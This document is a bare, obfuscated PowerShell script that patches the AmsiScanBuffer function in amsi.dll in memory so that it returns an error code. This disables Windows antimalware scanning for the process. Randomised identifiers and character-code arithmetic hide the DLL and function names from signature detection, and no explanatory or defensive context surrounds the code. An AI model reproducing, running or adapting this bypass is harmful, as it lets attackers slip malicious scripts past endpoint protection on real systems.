$qb42Kcnmd7lnCC = @"
using System;
using System.Runtime.InteropServices;
public class qb42Kcnmd7lnCC {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr _xEQWYmNfBzmZ6vu, string i0tuapOyAMLiR8z);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr IQGiFOVZn, UIntPtr l2weBBMP, uint jLP6O, out uint yu33ZNwYTZ);
}
"@

Add-Type $qb42Kcnmd7lnCC

$EJkNqT7gYYbt = [qb42Kcnmd7lnCC]::LoadLibrary("$(('âmsî'+'.dll').norMaLizE([CHAr]([BYte]0x46)+[chAR]([ByTE]0x6f)+[chAr](114+66-66)+[ChAr]([BytE]0x6d)+[cHAr]([byTe]0x44)) -replace [chaR]([bYtE]0x5c)+[cHar]([BYte]0x70)+[char]([ByTE]0x7b)+[char]([ByTe]0x4d)+[ChAR](110+4-4)+[CHAr](125+93-93))")
$MhkvU_T0NvI = [qb42Kcnmd7lnCC]::GetProcAddress($EJkNqT7gYYbt, "$([ChaR](65*27/27)+[CHAR]([BYTE]0x6d)+[ChAr]([ByTE]0x73)+[CHAr](105*3/3)+[cHaR]([Byte]0x53)+[chAr](99*44/44)+[cHar](8+89)+[ChaR]([byte]0x6e)+[cHar]([ByTe]0x42)+[chaR]([byTe]0x75)+[cHAr]([bYTE]0x66)+[chAR](43+59)+[chAr]([bytE]0x65)+[CHAR]([BYtE]0x72))")
$p = 0
[qb42Kcnmd7lnCC]::VirtualProtect($MhkvU_T0NvI, [uint32]5, 0x40, [ref]$p)
$HOK93PLt = "0xB8"
$JB2D3NGik = "0x57"
$T5h8GuE = "0x00"
$IUDiOYcnS = "0x07"
$BX84N9zaXap = "0x80"
$gLMk = "0xC3"
$lT43OqWjrJworkG = [Byte[]] ($HOK93PLt,$JB2D3NGik,$T5h8GuE,$IUDiOYcnS,+$BX84N9zaXap,+$gLMk)
[System.Runtime.InteropServices.Marshal]::Copy($lT43OqWjrJworkG, 0, $MhkvU_T0NvI, 6)